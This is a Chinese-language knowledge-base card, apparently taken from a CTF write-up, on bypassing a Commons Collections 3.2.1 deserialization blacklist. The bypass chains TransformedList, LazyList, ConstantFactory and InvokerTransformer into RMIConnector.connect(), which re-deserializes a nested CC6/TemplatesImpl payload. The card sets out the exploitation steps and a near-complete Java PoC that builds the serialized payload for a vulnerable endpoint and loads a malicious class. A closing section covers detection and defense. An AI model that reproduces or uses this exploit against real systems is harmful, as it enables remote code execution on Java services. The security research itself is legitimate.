---
id: web-java-deser-commonscollections-transformedlist-invoker-arbitrary-method
title: CC 3.2.1 黑名单绕过：TransformedList.set + LazyList.get + InvokerTransformer 触发任意方法
type: scenario
domain: web
path: web/java/deserialization
technique: transformedlist-lazylist-invokertransformer-arbitrary-method
tags:
- java
- deserialization
- commons-collections
- transformedlist
- lazylist
- invokertransformer
- constantfactory
- blacklist-bypass
- rmi
- rmiconnector
- templatesimpl
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V241
  verified_at: '2026-11-07T13:11:10+08:00'
  notes: 已对照原文与21张图核对；CC 3.2.1、denyClasses、TransformedList.set/LazyList.get/ConstantFactory/InvokerTransformer 与 RMIConnector /stub 二次反序列化均一致；PoC 未复跑。
affected_versions: Commons Collections 3.2.1
url: /docs/web/java/deserialization/web-java-deser-commonscollections-transformedlist-invoker-arbitrary-method/
draft: false
kb_aliases:
- TransformedList 触发 InvokerTransformer
- LazyList ConstantFactory 链
- CC 黑名单绕过
- EventListenerList UndoManager X509CertPath 触发链
- InvokerTransformer 调 RMIConnector.connect
- CommonsCollections 3.2.1 新链
---

## 一句话结论

当 CommonsCollections 3.2.1 应用把 `ChainedTransformer`、`LazyMap`、`TiedMapEntry`、`TemplatesImpl`、`ConstantTransformer`、`TransformedMap` 等常见链类加入 `resolveClass` 黑名单、但漏掉 `TransformedList`、`LazyList`、`ConstantFactory`、`InvokerTransformer` 时，可以用 `EventListenerList → UndoManager.edits → CodeSigner.signerCertPath → X509CertPath.certs` 作为触发入口，反序列化时走到 `LazyList.get(0)`：元素为 null 触发 `ConstantFactory.create()` 返回目标对象，随后 `LazyList.set(0, obj)` 调到底层 `TransformedList.set()`，再进入 `InvokerTransformer.transform(obj)` 反射执行目标对象的任意无参方法；原文用它调用 `RMIConnector.connect()`，借 JMXServiceURL 的 `/stub/<base64>` 在本地二次反序列化内嵌的 CC6/TemplatesImpl payload，完成 RCE。

## 原理

- **黑名单漏掉的类**：目标 `N1ghtObjectInputStream` 的 `denyClasses` 覆盖 `TransformedMap`、`ChainedTransformer`、`InstantiateTransformer`、`LazyMap`、`TemplatesImpl`、`TrAXFilter`、`ConstantTransformer`、`MapTransformer`、`FactoryTransformer`、`InstantiateFactory`、`TiedMapEntry`、`BadAttributeValueExpException`、`DefaultedMap`、`TreeBag`、`TransformingComparator`、`TransformerClosure`、`HashMap`、`Hashtable`、`URL`、`JdbcRowSetImpl`、`SignedObject` 等，但没有拦截 `TransformedList`、`LazyList`、`ConstantFactory`、`InvokerTransformer`、`ListOrderedMap`、`X509CertPath`、`CodeSigner`、`EventListenerList`、`UndoManager`、`RMIConnector`、`JMXServiceURL`。
- **触发入口**：`EventListenerList` 持有 `listenerList` 数组（放入 `InternalError.class` 与 `UndoManager`）；`UndoManager` 的 `edits` Vector 放入 `CodeSigner`；`CodeSigner.signerCertPath` 指向伪造的 `X509CertPath`；`X509CertPath.certs` 指向 `LazyList`。反序列化过程沿这条对象图走到 `LazyList.get(0)`（原文直接观察到该调用），从而进入后面的 `set/transform` 逻辑。
- **`LazyList.get(0)` 的两步副作用**：列表中第 0 个元素为 `null`，于是调用 `this.factory.create()`；`factory` 是 `ConstantFactory`，其 `create()` 直接返回构造时传入的对象（原文传入 `RMIConnector`）。拿到对象后，`LazyList` 为缓存它执行 `this.getList().set(index, object)`。
- **`TransformedList.set()` 是 sink**：`LazyList` 的底层列表是 `TransformedList.decorate(ArrayList, InvokerTransformer)`；`TransformedList.set(int, Object)` 先执行 `object = this.transform(object)`，再 `return this.getList().set(index, object)`。`transform` 即 `InvokerTransformer.transform(input)`。
- **`InvokerTransformer.transform()` 执行任意无参方法**：它取 `input.getClass()`，用 `getMethod(this.iMethodName, this.iParamTypes)` 找到方法并 `method.invoke(input, this.iArgs)`；原文设置 `iMethodName="connect"`、参数类型和参数都为 null，等价于调用 `RMIConnector.connect()`。
- **二次反序列化与黑名单隔离**：`RMIConnector` 的 `JMXServiceURL` 为 `service:jmx:rmi://`，反射把 `urlPath` 改成 `/stub/<base64>`；`connect()` 会把 `/stub/` 后的 Base64 解码并作为 `RMIServer` stub 反序列化。内层 payload 是 CC6（`TiedMapEntry` + `LazyMap` + `InvokerTransformer("newTransformer")`）包裹 `TemplatesImpl`，其 `_bytecodes` 为目标类的字节码。内层流由 JDK 自己创建，外层 `resolveClass` 黑名单不参与，且 `TemplatesImpl`/`HashMap` 等被禁类只出现在 Base64 字符串里，外层流的类名不会命中黑名单。
- **`TemplatesImpl` 加载恶意类**：内层 `TemplatesImpl.newTransformer()` 触发 `defineClass` 加载 `EvilBlade`（继承 `AbstractTranslet`），其构造器/静态块完成内存马注册或命令执行。原文最终通过该链注册 Blade 路由并读取 flag。
- 因为 `LazyList`/`TransformedList`/`ConstantFactory` 都是可序列化的 `Serializable` 装饰器，字段可通过 `Unsafe` 直接写入（`ListOrderedMap.insertOrder`、`X509CertPath.certs`、`CodeSigner.signerCertPath`、`EventListenerList.listenerList`），不需要调用会触发链的 put/set 方法，避免在构造阶段提前触发。

## 触发条件

- classpath 存在 CommonsCollections 3.2.1（原文 `commons-collections-3.2.1`）。
- 应用对不可信数据调用 `ObjectInputStream.readObject()`，并用子类重写 `resolveClass` 做类名黑名单（不是 JEP290 全局 `jdk.serialFilter`/`ObjectInputFilter`）。
- 黑名单漏掉 `TransformedList`、`LazyList`、`ConstantFactory`、`InvokerTransformer` 或同类可组合的 Collections 装饰器；`RMIConnector`、`X509CertPath`、`EventListenerList`、`UndoManager` 未被拦截。
- JDK 8（原文 `jdk1.8.0_162`），`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 可用且未被模块强封装。
- 需要能投递二进制序列化数据（原文 POST `/challenge` 读取请求体）。
- 若走 `RMIConnector` 内层 payload：需要 JMX 模块存在；`/stub/<base64>` 的解码发生在 `connect()` 内部，不需要目标出网。

## 利用步骤

1. 审计黑名单与 classpath：列出被禁类，确认 `TransformedList`/`LazyList`/`ConstantFactory`/`InvokerTransformer` 等未被禁；确认 CC 3.2.1 与 `RMIConnector` 可用。
2. 准备内层 payload：用 CC6 链（`TiedMapEntry` + `LazyMap` + `InvokerTransformer("newTransformer")`）包裹 `TemplatesImpl`，`_bytecodes` 放入恶意 `AbstractTranslet` 子类字节码；序列化后 Base64 编码。
3. 构造 `JMXServiceURL("service:jmx:rmi://")`，反射把 `urlPath` 设为 `/stub/<内层Base64>`；构造 `RMIConnector(url, null)`。
4. 构造外层链：`ArrayList` 放一个 `null`，用 `TransformedList.decorate(list, new InvokerTransformer("connect", null, null))` 得到底层 list；再用 `LazyList.decorate(transformedList, new ConstantFactory(rmiConnector))` 得到 `decorate`。
5. 用 `Unsafe` 依次设置：`ListOrderedMap.insertOrder = decorate`；`X509CertPath.certs = decorate`；`CodeSigner.signerCertPath = X509CertPath`；`UndoManager.edits` Vector 加入 `CodeSigner`；`EventListenerList.listenerList = {InternalError.class, UndoManager}`。
6. 序列化 `EventListenerList`，把字节作为请求体发送到反序列化入口；触发后 `LazyList.get(0)` → `ConstantFactory.create()` → `TransformedList.set()` → `InvokerTransformer.transform()` → `RMIConnector.connect()` → 内层 CC6/TemplatesImpl → 恶意类构造器执行。
7. 访问恶意类注册的路由/触发命令执行，验证回显。

## PoC

核心结构（省略 import 与异常处理；完整字段偏移需按目标 JDK/类版本确认）：

```java
// 内层：CC6 + TemplatesImpl（TemplatesImpl/HashMap 在外层黑名单中，但只存在于 Base64 里）
TemplatesImpl tpl = new TemplatesImpl();
setField(tpl, "_bytecodes", new byte[][]{Files.readAllBytes(Paths.get("EvilBlade.class"))});
setField(tpl, "_name", "a");
setField(tpl, "_tfactory", new TransformerFactoryImpl());
Map inner = new HashMap();
Map lazy = LazyMap.decorate(inner, new ConstantTransformer(1));
TiedMapEntry entry = new TiedMapEntry(lazy, tpl);
HashMap outerMap = new HashMap();
outerMap.put(entry, "test");
lazy.remove(tpl);
setField(lazy, "factory", new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}));
String innerB64 = Base64.getEncoder().encodeToString(serialize(outerMap));

// 外层：TransformedList.set -> InvokerTransformer -> RMIConnector.connect
JMXServiceURL url = new JMXServiceURL("service:jmx:rmi://");
setField(url, "urlPath", "/stub/" + innerB64);
RMIConnector connector = new RMIConnector(url, null);

List<Object> list = new ArrayList<>();
list.add(null);
List transformed = TransformedList.decorate(list, new InvokerTransformer("connect", null, null));
List lazyList = LazyList.decorate(transformed, new ConstantFactory(connector));

ListOrderedMap ordered = (ListOrderedMap) ListOrderedMap.decorate(new HashMap<>());
Unsafe unsafe = getUnsafe();
unsafe.putObject(ordered, unsafe.objectFieldOffset(ListOrderedMap.class.getDeclaredField("insertOrder")), lazyList);

X509CertPath certPath = (X509CertPath) unsafe.allocateInstance(X509CertPath.class);
unsafe.putObject(certPath, unsafe.objectFieldOffset(X509CertPath.class.getDeclaredField("certs")), lazyList);

CodeSigner signer = (CodeSigner) unsafe.allocateInstance(CodeSigner.class);
unsafe.putObject(signer, unsafe.objectFieldOffset(CodeSigner.class.getDeclaredField("signerCertPath")), certPath);

UndoManager manager = new UndoManager();
((Vector) getField(manager, "edits")).add(signer);

EventListenerList listeners = new EventListenerList();
unsafe.putObject(listeners, unsafe.objectFieldOffset(EventListenerList.class.getDeclaredField("listenerList")),
        new Object[]{InternalError.class, manager});

byte[] payload = serialize(listeners); // 发送到反序列化入口
```

## 变体与关联

- `InvokerTransformer` 能调用任意无参方法；本例选 `RMIConnector.connect()` 是为了复用 `/stub/<base64>` 二次反序列化原语（详见库内“自定义 readObject 反射调用 + RMIConnector 二次反序列化绕过黑名单”卡）。也可改为其他有副作用且无参的目标方法，取决于目标 classpath。
- 与常见 CC1/CC6 卡的区别：`ChainedTransformer`、`LazyMap`、`TiedMapEntry`、`TransformedMap`、`TemplatesImpl` 均被禁；本链用 `TransformedList.set` + `LazyList.get` + `ConstantFactory` 替代，属于黑名单绕过型 gadget，不是标准链的参数改写。
- 与 CC4 `TransformerClosure` 复用对象卡的区别：本链不依赖 `ChainedTransformer`（被禁），而是利用 `LazyList.get` 的 `factory.create()` 与 `set` 两步副作用把“取对象”和“调方法”串起来。
- 内层 `TemplatesImpl._bytecodes` 可放多个 class（含匿名内部类时按顺序放入二维数组），用于加载带内部类的内存马；原文加载 `ServerBootstrapInterceptor` 及其 `$1/$1$1` 三个 class。

## 检测与防御

- **不要用类名黑名单**：改用 JEP290 全局 `jdk.serialFilter` 或 `ObjectInputFilter` 白名单，限定可反序列化的类；黑名单总会漏掉 `TransformedList`/`LazyList`/`ConstantFactory` 这类装饰器。
- **禁用危险原语**：若业务不使用 CommonsCollections，直接移除依赖或升级；至少禁止 `InvokerTransformer`、`TransformedList`、`LazyList`、`ConstantFactory`、`RMIConnector`、`X509CertPath`、`EventListenerList`、`UndoManager` 进入反序列化流。
- **限制二次反序列化**：设置 `jdk.serialFilter` 对 `RMIConnector`/`JMXServiceURL` 的类进行拦截，或禁用 JMX RMI 连接；JDK 高版本可启用 JEP290 全局过滤器与模块封装。
- **检测**：监控序列化流中的类名（`org.apache.commons.collections.list.TransformedList`、`LazyList`、`functors.ConstantFactory`、`InvokerTransformer`、`javax.management.remote.rmi.RMIConnector`、`sun.security.provider.certpath.X509CertPath`、`javax.swing.event.EventListenerList`、`javax.swing.undo.UndoManager`）；对 `/stub/` 长 Base64 字符串和异常 `connect` 调用告警。
- **最小权限**：反序列化服务降权运行，限制其文件/网络权限；及时打 JDK/CommonsCollections 补丁。
